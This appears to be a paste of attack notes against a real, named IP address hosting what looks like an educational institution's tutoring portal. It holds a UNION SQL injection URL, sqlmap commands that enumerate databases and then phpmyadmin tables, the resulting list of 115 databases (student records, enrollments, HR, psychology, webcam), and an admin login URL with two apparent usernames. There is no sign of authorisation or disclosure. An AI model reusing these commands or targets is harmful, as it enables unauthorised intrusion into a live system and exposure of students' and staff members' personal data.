
```
https://201.117.53.243/tutor/index.php?c=general&&a=cambiar2&&archi=valores&&id=4%20union%20select%20null,null,table_name,null,null%20FROM%20information_schema.tables;

sqlmap -u "https://201.117.53.243/tutor/index.php?c=general&&a=cambiar2&&archi=valores&&id=4" -p id --dbms=MySQL --dbs  

```


```
available databases [115]:
[*] aprendizaje
[*] aspirantes
[*] biblioteca
[*] chekin
[*] congre2019
[*] congresomic
[*] congresomic_app
[*] congresomicPrue
[*] cuestionarios_te8
[*] cuestionarios_tnm
[*] db_escolares
[*] devoluciones
[*] dgestej2018
[*] encu_jd14
[*] encuentro_ca3
[*] enviatron
[*] escolares
[*] escolares20
[*] escolares_cardex
[*] escolares_conect
[*] escolares_jd18
[*] escolares_nueva
[*] escolares_respaldo
[*] eva_ej19
[*] eval_doc_english
[*] eval_jd
[*] eval_res_social
[*] examen_interno
[*] fmaestria
[*] idiomas
[*] idiomas_externo
[*] in_itesa
[*] information_schema
[*] ins
[*] insc1
[*] inscripciones
[*] inscripciones20092023
[*] intranet
[*] investigacion
[*] itesa
[*] itesa-perfiles
[*] itesa_accesos
[*] itesa_almacen2
[*] itesa_almacen2_092023
[*] itesa_almacen2_12102023
[*] itesa_almacen2_29092023
[*] itesa_biblioteca
[*] itesa_catalogo_servicios
[*] itesa_clima_laboral
[*] itesa_clima_laboral_interna
[*] itesa_clima_laboral_jd2017
[*] itesa_clima_laboral_jd2020
[*] itesa_convenios
[*] itesa_convivenciaEsc_ej2020
[*] itesa_convivenciaEsc_ej2021
[*] itesa_convivenciaEsc_ej2022
[*] itesa_convivenciaEsc_ej2023
[*] itesa_convivenciaEsc_jd2020
[*] itesa_convivenciaEsc_jd2021
[*] itesa_convivenciaEsc_jd2022
[*] itesa_convivenciaEsc_jd2023
[*] itesa_discapacidad
[*] itesa_egresados
[*] itesa_enai
[*] itesa_encservicios
[*] itesa_escolares
[*] itesa_inscripciones_m_ej20
[*] itesa_intranet
[*] itesa_rh
[*] itesa_rm
[*] itesa_rmsg
[*] itesa_servicioSocial
[*] itesa_ubica_tec
[*] Linketron
[*] mysql
[*] necesaria
[*] openhouse
[*] paginaitesa
[*] performance_schema
[*] phpmyadmin
[*] profile
[*] pruebas
[*] psicologia
[*] re_inscripciones
[*] reinscripciones
[*] RespaldoFichas
[*] servicios
[*] SICE
[*] sicee
[*] siceej2018
[*] siceej2019
[*] siceej2020
[*] siceej2021
[*] siceej2022
[*] siceej2023
[*] sicejd2018
[*] sicejd2019
[*] sicejd2020
[*] sicejd2021
[*] sicejd2022
[*] sicejd2023
[*] sistema
[*] test_vocacional
[*] test_vocacional13-15
[*] test_vocacional17
[*] test_vocacional19
[*] test_vocacional21
[*] test_vocacionalPer12
[*] test_vocacionalPer7-11
[*] TestDB
[*] titulaciones
[*] tmp
[*] trazabilidad
[*] tuto_ej2019
[*] webcam

```

```
sqlmap -u "https://201.117.53.243/tutor/index.php?c=general&&a=cambiar2&&archi=valores&&id=4" -p id --dbms=MySQL -D phpmyadmin --tables --batch

```

```
https://201.117.53.243/dba/index.php
armando
ahuerta
```